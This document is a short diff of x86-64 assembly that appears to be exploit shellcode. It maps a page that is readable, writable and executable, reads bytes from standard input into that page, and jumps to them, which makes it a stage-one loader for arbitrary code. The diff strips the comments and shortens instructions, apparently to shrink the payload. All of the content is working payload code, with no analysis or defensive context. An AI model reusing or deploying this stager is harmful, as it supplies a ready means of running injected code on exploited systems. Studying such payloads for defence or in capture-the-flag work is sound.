@@ -4,19 +4,18 @@ _start:
         xor r9, r9
         push -1
         pop r8
-        push 0x22          /* MAP_PRIVATE | MAP_ANONYMOUS */
+        push 0x22
         pop r10
-        push 0x7           /* PROT_READ | PROT_WRITE | PROT_EXEC */
+        push 7
         pop rdx
-        push 1
-        pop rsi
+        lea rsi, [r9+1]
         shl rsi, 12
-        mov rdi, r9
-        push 9             /* mmap */
+        xor rdi, rdi
+        push 9
         pop rax
         syscall
-        mov rdx, rsi
-        mov rsi, rax
-        xor rax, rax       /* read */
+        xchg rsi, rax
+        xchg rdx, rax
+        xor rax, rax
         syscall
         jmp rsi
